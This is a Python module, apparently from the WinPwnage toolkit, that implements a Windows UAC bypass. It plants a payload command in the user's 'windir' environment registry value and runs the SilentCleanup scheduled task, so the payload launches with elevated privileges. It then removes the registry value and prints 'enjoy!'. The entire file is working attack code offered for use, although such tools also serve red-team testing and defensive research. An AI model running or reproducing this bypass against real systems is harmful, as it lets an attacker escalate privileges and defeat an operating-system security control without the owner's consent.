import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

silentcleanup_info = {
	"Description": "Bypass UAC using silentcleanup and registry key manipulation",
	"Id": "4",
	"Type": "UAC bypass",
	"Fixed In": "999999",
	"Works From": "9600",
	"Admin": False,
	"Function Name": "silentcleanup",
	"Function Payload": True,
}


def silentcleanup(payload):
	if payloads().exe(payload):
		try:
			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join("Environment"))
			_winreg.SetValueEx(key, "windir", 0, _winreg.REG_SZ, "cmd.exe /k {} & ".format(os.path.join(payload)))
			_winreg.CloseKey(key)
		except Exception as error:
			print_error("Unable to create registry keys, exception was raised: {}".format(error))
			return False
		else:
			print_success("Successfully created WINDIR key containing payload ({})".format(os.path.join(payload)))

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("schtasks.exe", params="/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"):
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))

		time.sleep(5)

		try:
			key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Environment", 0, _winreg.KEY_ALL_ACCESS)
			_winreg.DeleteValue(key, "windir")
		except Exception as error:
			print_error("Unable to cleanup")
			return False
		else:
			print_success("Successfully cleaned up, enjoy!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
